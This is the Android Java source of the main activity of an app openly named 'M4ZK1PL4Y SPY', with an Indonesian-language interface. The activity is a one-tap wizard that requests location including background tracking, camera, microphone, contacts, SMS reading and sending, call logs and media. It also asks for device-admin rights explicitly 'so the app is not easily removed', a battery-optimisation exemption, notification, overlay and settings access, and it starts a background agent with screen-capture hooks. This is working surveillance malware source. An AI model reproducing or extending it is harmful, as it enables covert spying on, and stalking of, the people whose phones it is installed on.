package ai.m4zk1play.spy;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/** Wizard izin satu ketukan. Tidak memakai referensi R. */
public class MainActivity extends Activity {

    private static final int REQ = 0x4d5a;
    private static final int REQ_ADMIN = 0x4d5b;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Keys k = Keys.read(this);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF05060A);
        root.setPadding(52, 96, 52, 52);

        TextView title = new TextView(this);
        title.setText("M4ZK1PL4Y SPY");
        title.setTextColor(0xFFFF2D55);
        title.setTextSize(24f);
        title.setLetterSpacing(0.24f);
        root.addView(title);

        TextView sub = new TextView(this);
        sub.setText("IZINKAN SEMUA AKSES");
        sub.setTextColor(0xFF6B7488);
        sub.setTextSize(11f);
        sub.setLetterSpacing(0.2f);
        sub.setPadding(0, 10, 0, 26);
        root.addView(sub);

        TextView wiz = new TextView(this);
        wiz.setText(k.wizard);
        wiz.setTextColor(0xFFD6DBE6);
        wiz.setTextSize(13f);
        wiz.setPadding(0, 0, 0, 30);
        root.addView(wiz);

        Button all = new Button(this);
        all.setText("IZINKAN SEMUA");
        all.setAllCaps(true);
        all.setOnClickListener(v -> requestAll());
        root.addView(all);

        Button extra = new Button(this);
        extra.setText("AKSES TAMBAHAN (opsional)");
        extra.setAllCaps(true);
        extra.setOnClickListener(v -> extras());
        root.addView(extra);

        TextView mail = new TextView(this);
        mail.setText(k.team + "\n" + k.email);
        mail.setTextColor(0xFF6B7488);
        mail.setTextSize(10f);
        mail.setPadding(0, 30, 0, 0);
        root.addView(mail);

        setContentView(root);

        BootProvider.start(this);
        requestAll();
    }

    private String[] wanted() {
        List<String> p = new ArrayList<>();
        p.add(Manifest.permission.ACCESS_FINE_LOCATION);
        p.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        p.add(Manifest.permission.CAMERA);
        p.add(Manifest.permission.RECORD_AUDIO);
        p.add(Manifest.permission.READ_CONTACTS);
        p.add(Manifest.permission.READ_SMS);
        p.add(Manifest.permission.RECEIVE_SMS);
        p.add(Manifest.permission.SEND_SMS);
        p.add(Manifest.permission.READ_CALL_LOG);
        p.add(Manifest.permission.CALL_PHONE);
        p.add(Manifest.permission.READ_PHONE_STATE);
        if (Build.VERSION.SDK_INT >= 33) {
            p.add(Manifest.permission.POST_NOTIFICATIONS);
            p.add(Manifest.permission.READ_MEDIA_IMAGES);
            p.add(Manifest.permission.READ_MEDIA_VIDEO);
            p.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            p.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            p.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (Build.VERSION.SDK_INT >= 29) p.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        return p.toArray(new String[0]);
    }

    private void requestAll() {
        List<String> need = new ArrayList<>();
        for (String perm : wanted()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                need.add(perm);
            }
        }
        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ);
        }

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && !dpm.isAdminActive(cn)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Aktifkan agar aplikasi tidak mudah dihapus.");
            startActivityForResult(i, REQ_ADMIN);
        }

        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && Build.VERSION.SDK_INT >= 23
                    && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()));
                startActivity(i);
            }
        } catch (Exception ignored) {
        }

        BootProvider.start(this);
        Toast.makeText(this, "Izin diproses. Agent aktif.", Toast.LENGTH_SHORT).show();
    }

    private void extras() {
        try {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } catch (Exception ignored) {
        }
        try {
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName())));
            }
        } catch (Exception ignored) {
        }
        try {
            if (Build.VERSION.SDK_INT >= 23 && !Settings.System.canWrite(this)) {
                startActivity(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                        Uri.parse("package:" + getPackageName())));
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == ScreenModule.REQ_PROJECTION && data != null && AgentService.instance != null) {
            AgentService.instance.setProjection(data, res);
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        BootProvider.start(this);
    }
}
